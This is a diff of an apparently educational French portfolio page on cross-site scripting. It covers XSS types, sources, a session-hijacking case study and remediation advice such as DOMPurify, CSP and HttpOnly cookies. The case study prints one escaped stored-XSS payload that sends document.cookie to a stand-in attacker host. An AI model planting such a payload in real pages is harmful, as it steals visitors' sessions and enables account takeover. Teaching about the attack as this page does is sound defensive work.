@@ -6,6 +6,68 @@
     <title>Veille Cyber XSS | Léo Rasolomanana</title>
     <link href="CSS/style.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+    <style>
+    /* 1. On unifie le fond et le texte global */
+    body {
+        background-color: #0d1117; 
+        color: #e6edf3;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    /* 2. Correction du tableau (Le coupable du fond blanc) */
+    table {
+        width: 100%;
+        margin-top: 20px;
+        border-collapse: collapse;
+        background: #161b22 !important; /* On force le fond sombre */
+        color: #e6edf3 !important;      /* On force le texte clair */
+        border: 1px solid #30363d;
+    }
+
+    th {
+        background-color: #21262d;
+        color: #58a6ff;
+        padding: 12px;
+        border: 1px solid #30363d;
+    }
+
+    td {
+        padding: 12px;
+        border: 1px solid #30363d;
+        color: #e6edf3 !important; /* Pour contrer le gris clair invisible */
+    }
+
+    /* 3. Les titres de sections en bleu */
+    h1, h3 { color: #58a6ff; }
+    
+    /* 4. Les boîtes (Étude de cas et Remédiation) */
+    .veille-box, .veille-box-cyber {
+        background: #161b22 !important;
+        border: 1px solid #30363d !important;
+        padding: 20px;
+        border-radius: 8px;
+        margin-top: 20px;
+        color: #e6edf3 !important;
+    }
+
+    /* Spécifique Étude de cas (Bordure rouge) */
+    .danger-box {
+        border-left: 5px solid #f85149 !important;
+    }
+
+    /* 5. Les Badges des sources */
+    .badge {
+        display: inline-block;
+        padding: 5px 15px;
+        background: #21262d;
+        border: 1px solid #30363d;
+        border-radius: 20px;
+        color: #58a6ff;
+        font-size: 0.85em;
+        margin-right: 8px;
+    }
+</style>
 </head>
 <body>
     <header>
@@ -17,45 +79,80 @@
         </nav>
     </header>
 
-    <section style="margin-top: 100px;">
+    <section style="margin-top: 100px; padding-bottom: 50px;">
         <div class="container">
             <h1><i class="fas fa-user-shield"></i> Veille Cyber : Failles Cross-Site Scripting (XSS)</h1>
-            <p class="intro">Analyse d'une des vulnérabilités les plus répandues du web (OWASP Top 10).</p>
+            <p class="intro">Analyse d'une des vulnérabilités les plus critiques du web (OWASP Top 10).</p>
             
             <div class="veille-content">
                 <div class="veille-box highlight-cyber">
                     <h3><i class="fas fa-bug"></i> Comprendre la menace</h3>
-                    <p>La faille XSS consiste à injecter des scripts malveillants dans des pages web consultées par d'autres utilisateurs. Cela peut mener au vol de cookies de session ou à la redirection vers des sites de phishing.</p>
+                    <p>La faille XSS consiste à injecter des scripts malveillants dans des pages web consultées par d'autres utilisateurs. Contrairement à l'injection SQL, la cible n'est pas le serveur, mais le <strong>navigateur du client</strong>.</p>
                 </div>
 
-                <h3><i class="fas fa-search"></i> Sources de Veille</h3>
-                <div class="outils-veille">
-                    <span class="badge">ANSSI</span>
-                    <span class="badge">PortSwigger (Burp Suite)</span>
-                    <span class="badge">OWASP</span>
-                    <span class="badge">Zataz</span>
-                </div>
-
-                <h3><i class="fas fa-shield-alt"></i> Mesures de Protection</h3>
-                <table style="width:100%; margin-top: 20px; border-collapse: collapse;">
+                <h3><i class="fas fa-list-ul"></i> Types de vulnérabilités</h3>
+                <table style="width:100%; margin-top: 20px; border-collapse: collapse; background: white;">
                     <tr style="background-color: #333; color: white;">
-                        <th style="padding: 10px; border: 1px solid #444;">Type XSS</th>
-                        <th style="padding: 10px; border: 1px solid #444;">Description</th>
-                        <th style="padding: 10px; border: 1px solid #444;">Remédiation</th>
+                        <th style="padding: 12px; border: 1px solid #444;">Type XSS</th>
+                        <th style="padding: 12px; border: 1px solid #444;">Mécanisme</th>
+                        <th style="padding: 12px; border: 1px solid #444;">Dangerosité</th>
                     </tr>
                     <tr>
-                        <td style="padding: 10px; border: 1px solid #444;">Stockée</td>
-                        <td style="padding: 10px; border: 1px solid #444;">Script enregistré en BDD (ex: commentaires).</td>
-                        <td style="padding: 10px; border: 1px solid #444;">Sanitization des entrées.</td>
+                        <td style="padding: 12px; border: 1px solid #444;"><strong>Stockée (Persistent)</strong></td>
+                        <td style="padding: 12px; border: 1px solid #444;">Script enregistré en BDD (ex: commentaires, profils).</td>
+                        <td style="padding: 12px; border: 1px solid #444; color: #e74c3c; font-weight: bold;">Critique</td>
                     </tr>
                     <tr>
-                        <td style="padding: 10px; border: 1px solid #444;">Réfléchie</td>
-                        <td style="padding: 10px; border: 1px solid #444;">Script passé via une URL.</td>
-                        <td style="padding: 10px; border: 1px solid #444;">Encodage des sorties HTML.</td>
+                        <td style="padding: 12px; border: 1px solid #444;"><strong>Réfléchie (Reflected)</strong></td>
+                        <td style="padding: 12px; border: 1px solid #444;">Script passé via une URL ou un paramètre de recherche.</td>
+                        <td style="padding: 12px; border: 1px solid #444; color: #f39c12; font-weight: bold;">Élevée</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 12px; border: 1px solid #444;"><strong>DOM-based</strong></td>
+                        <td style="padding: 12px; border: 1px solid #444;">Modification dynamique de l'environnement côté client (JS).</td>
+                        <td style="padding: 12px; border: 1px solid #444; color: #3498db; font-weight: bold;">Modérée</td>
                     </tr>
                 </table>
 
-                <p style="margin-top: 20px;"><strong>Conclusion :</strong> Ma veille montre que l'implémentation d'une politique de sécurité de contenu (CSP) reste la défense la plus robuste contre ces attaques.</p>
+                <h3 style="margin-top: 30px;"><i class="fas fa-search"></i> Sources de Veille</h3>
+                <div class="outils-veille">
+                    <span class="badge">ANSSI</span>
+                    <span class="badge">PortSwigger (Burp Suite)</span>
+                    <span class="badge">OWASP Foundation</span>
+                    <span class="badge">CVE Mitre</span>
+                </div>
+
+                <div class="veille-box" style="border-left: 5px solid #e74c3c; background: #fff5f5; padding: 20px; margin-top: 30px; border-radius: 8px;">
+                    <h3 style="color: #c0392b;"><i class="fas fa-exclamation-triangle"></i> Étude de Cas : Vol de Session (Hijacking)</h3>
+                    <p><strong>Vecteur d'attaque :</strong> Un champ "avis client" non filtré sur une plateforme e-commerce.</p>
+                    <p><strong>Payload injecté :</strong> <code>&lt;script&gt;fetch('https://malicious.com/log?c='+document.cookie)&lt;/script&gt;</code></p>
+                    <p><strong>Mécanisme :</strong> Le script est stocké en base. Chaque utilisateur consultant le produit envoie automatiquement son cookie de session vers le serveur de l'attaquant.</p>
+                    <p><strong>Impact :</strong> Usurpation de compte totale, accès aux données bancaires et personnelles.</p>
+                </div>
+
+                <h3 style="margin-top: 30px;"><i class="fas fa-shield-alt"></i> Mesures de Remédiation</h3>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                    <div class="veille-box" style="background: #e8f4fd;">
+                        <h4>Protection Développement</h4>
+                        <ul>
+                            <li><strong>Sanitization :</strong> Utiliser des libs comme DOMPurify.</li>
+                            <li><strong>Output Encoding :</strong> Convertir les caractères spéciaux en entités HTML.</li>
+                            <li><strong>Validation :</strong> Filtrer les entrées (Type, Longueur, Format).</li>
+                        </ul>
+                    </div>
+                    <div class="veille-box" style="background: #eafaf1;">
+                        <h4>Sécurité Infrastructure</h4>
+                        <ul>
+                            <li><strong>CSP :</strong> Définir une Content Security Policy stricte.</li>
+                            <li><strong>Cookies :</strong> Flag <code>HttpOnly</code> et <code>Secure</code>.</li>
+                            <li><strong>WAF :</strong> Pare-feu applicatif pour bloquer les payloads connus.</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <p style="margin-top: 30px; padding: 15px; background: #333; color: white; border-radius: 5px;">
+                    <strong>Conclusion :</strong> Ma veille démontre qu'aucune méthode n'est infaillible seule. La stratégie "Defense in Depth" (Défense en profondeur), combinant assainissement du code et politique CSP robuste, est indispensable pour sécuriser les applications modernes.
+                </p>
             </div>
         </div>
     </section>
